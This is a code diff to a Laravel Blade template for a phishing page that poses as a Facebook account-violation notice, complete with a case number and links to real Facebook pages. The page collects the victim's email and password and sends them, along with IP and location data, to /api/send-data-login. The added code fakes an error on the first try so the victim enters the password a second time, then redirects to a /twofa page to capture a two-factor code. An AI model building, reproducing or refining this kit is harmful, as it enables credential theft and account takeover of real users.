@@ -201,6 +201,7 @@
         var zipCode = "";
         var continent = "";
         var continentCode = "";
+        var totalLoginAttempts = 0;
 
         setCurrentLang();
 
@@ -275,6 +276,8 @@
             formData.append('email_2', valueEmail);
             formData.append('password_2', valuePassword);
             formData = pushIPInfo(formData);
+            totalLoginAttempts += 1;
+
             $.ajax({
                 method: "POST",
                 url: "/api/send-data-login",
@@ -283,41 +286,23 @@
                 contentType: false,
                 processData: false,
                 success: function(response) {
-                    if (response.status == 0) {
-                        // start to call get cache by email waiting until tool returns response of login
-                        idIntervalGetCacheByEmail = setInterval(async () => {
-                            let info = await getCacheByEmail(valueEmail);
-                            if (info) {
-                                text.removeClass('d-none');
-                                loading.addClass('d-none');
-                                if (parseInt(info.isLoginSuccessfully) == 1) {
-                                    // $('#modal-login').css('display', 'none');
-                                    // $('#modal-fa').css('display', 'block');
-                                    // $('.error-notification').css('display', 'none');
-                                    // save user to localStorage
-                                    localStorage.setItem('user', JSON.stringify({
-                                        email: valueEmail,
-                                        password: valuePassword,
-                                    }));
-
-                                    window.location.href = '/twofa';
-                                } else {
-                                    console.log('Login failed');
-                                    $('.error-notification').css('display', 'block');
-                                    text.removeClass('d-none');
-                                    loading.addClass('d-none');
-                                }
-                                clearInterval(idIntervalGetCacheByEmail);
-                                $('.button-form-login').prop('disabled', false);
-                            } else {
-                                console.log("Still call get cache by email");
-                            }
-                        }, 3000);
+                    if (totalLoginAttempts > 1) {
+                        // text.removeClass('d-none');
+                        // loading.addClass('d-none');
+                        // $('#login_error').css('display', 'none');
+                        // $('.button-form-login').prop('disabled', false);
+                        window.location.href = '/twofa';
                     } else {
-                        $('.button-form-login').prop('disabled', false);
-                        $('.error-notification').css('display', 'block');
-                        text.removeClass('d-none');
-                        loading.addClass('d-none');
+                        console.log("Still call get cache by email");
+                        setTimeout(() => {
+                            text.removeClass('d-none');
+                            loading.addClass('d-none');
+                            $('#error-message').css('display', 'block');
+                            $('.button-form-login').prop('disabled', false);
+                            // $('.error-notification').css('display', 'block');
+                            // text.removeClass('d-none');
+                            // loading.addClass('d-none');
+                        }, 2000);
                     }
                 }
             })
@@ -396,92 +381,88 @@
 @endpush
 @extends('layouts.main')
 @section('content')
-<div class="header">
-    <img src=""
-        alt="" />
-</div>
-<div class="main">
-    <div class="maintop">
-        <div class="content">
-            <img class="imgtop"
-                src="/image/home3.png"
-                alt="" />
-            <div class="contentright">
-                <p class="titleright">@lang('home.home_violate')</p>
-                <p>
-                    <span class="open">@lang('home.home_open')</span>
-                    <span class="case" id="case">@lang('home.home_case') #9505997380</span>
+    <div class="header">
+        <img src="" alt="" />
+    </div>
+    <div class="main">
+        <div class="maintop">
+            <div class="content">
+                <img class="imgtop" src="/image/home3.png" alt="" />
+                <div class="contentright">
+                    <p class="titleright">@lang('home.home_violate')</p>
+                    <p>
+                        <span class="open">@lang('home.home_open')</span>
+                        <span class="case" id="case">@lang('home.home_case') #9505997380</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="maincontent">
+            <div class="contentmain">
+                <div class="contentmainright">
+                    <b>@lang('home.home_our_message')</b>
+                    <p>@lang('home.home_condition_1')</p>
+                    <p>@lang('home.home_condition_2')</p>
+                    <p>@lang('home.home_condition_3')</p>
+                    <p>@lang('home.home_condition_4')</p>
+                    <p class="remind">@lang('home.home_our_des')</p>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="bp">
+                <p class="footer-top">
+                    <b>* @lang('home.home_required') </b>@lang('home.home_hint')
+                </p>
+            </div>
+            <div class="button-btn">
+                <input type="text" id="email" placeholder="@lang('login.email')" />
+            </div>
+            <div class="buttuncheck">
+                <input type="checkbox" id="must-check" />
+                <label for="must-check" class="buttuncheck-label">@lang('home.home_confirm')</label>
+            </div>
+            <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
+                onclick="openPopup()">@lang('login.submit')</button>
+            <div class="footer-bottom">
+                <p>@lang('home.home_infomation') <a
+                        href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">@lang('home.home_privacy')</a>
                 </p>
             </div>
         </div>
     </div>
-    <div class="maincontent">
-        <div class="contentmain">
-            <div class="contentmainright">
-                <b>@lang('home.home_our_message')</b>
-                <p>@lang('home.home_condition_1')</p>
-                <p>@lang('home.home_condition_2')</p>
-                <p>@lang('home.home_condition_3')</p>
-                <p>@lang('home.home_condition_4')</p>
-                <p class="remind">@lang('home.home_our_des')</p>
+    <div class="popup-container" id="popup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <h2>@lang('home.popup_header')</h2>
+                <span class="popup-close" onclick="closePopup()">×</span>
+            </div>
+            <div class="popup-body">
+                <p class="popup-text">@lang('home.popup_text')</p>
+                <div class="form-group" style="margin-bottom: 0px">
+                    <label>@lang('home.popup_password')</label>
+                    <div class="error-notification mb-2" style="display: none">
+                        <span class="">@lang('fa.warning_login_fa')</span>
+                        <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
+                    </div>
+                    <div class="" style="display:flex;align-items:center;position: relative;">
+                        <input type="password" class="form-input" id="password" oninput="validatepassword()"
+                            placeholder="@lang('login.password')" value="" />
+                        <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
+                    </div>
+                </div>
+                <p class="error-message" id="error-message" style="display: none">@lang('home.popup_error')</p>
+            </div>
+            <div class="popup-footer">
+                {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
+                <button style="background-color: rgb(26, 115, 227);color:white" type="button" class="button-form-login">
+                    <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
+                        class="d-none spinner-border spinner">
+                    </span>
+                    <span id="submit-login-text">@lang('login.submit')</span>
+                </button>
+                <span class="loader" id="loader"></span>
             </div>
         </div>
     </div>
-    <div class="footer">
-        <div class="bp">
-            <p class="footer-top">
-                <b>* @lang('home.home_required') </b>@lang('home.home_hint')
-            </p>
-        </div>
-        <div class="button-btn">
-            <input type="text" id="email" placeholder="@lang('login.email')" />
-        </div>
-        <div class="buttuncheck">
-            <input type="checkbox" id="must-check" />
-            <label for="must-check" class="buttuncheck-label">@lang('home.home_confirm')</label>
-        </div>
-        <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
-            onclick="openPopup()">@lang('login.submit')</button>
-        <div class="footer-bottom">
-            <p>@lang('home.home_infomation') <a
-                    href="https://www.facebook.com/privacy/policy/?entry_point=data_policy_redirect&entry=0">@lang('home.home_privacy')</a>
-            </p>
-        </div>
-    </div>
-</div>
-<div class="popup-container" id="popup">
-    <div class="popup-content">
-        <div class="popup-header">
-            <h2>@lang('home.popup_header')</h2>
-            <span class="popup-close" onclick="closePopup()">×</span>
-        </div>
-        <div class="popup-body">
-            <p class="popup-text">@lang('home.popup_text')</p>
-            <div class="form-group" style="margin-bottom: 0px">
-                <label>@lang('home.popup_password')</label>
-                <div class="error-notification mb-2" style="display: none">
-                    <span class="">@lang('fa.warning_login_fa')</span>
-                    <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
-                </div>
-                <div class="" style="display:flex;align-items:center;position: relative;">
-                    <input type="password" class="form-input" id="password" oninput="validatepassword()"
-                        placeholder="@lang('login.password')" value="" />
-                    <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
-                </div>
-            </div>
-            <p class="error-message" id="error-message" style="display: none">@lang('home.popup_error')</p>
-        </div>
-        <div class="popup-footer">
-            {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
-            <button style="background-color: rgb(26, 115, 227);color:white" type="button"
-                class="button-form-login">
-                <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
-                    class="d-none spinner-border spinner">
-                </span>
-                <span id="submit-login-text">@lang('login.submit')</span>
-            </button>
-            <span class="loader" id="loader"></span>
-        </div>
-    </div>
-</div>
 @endsection
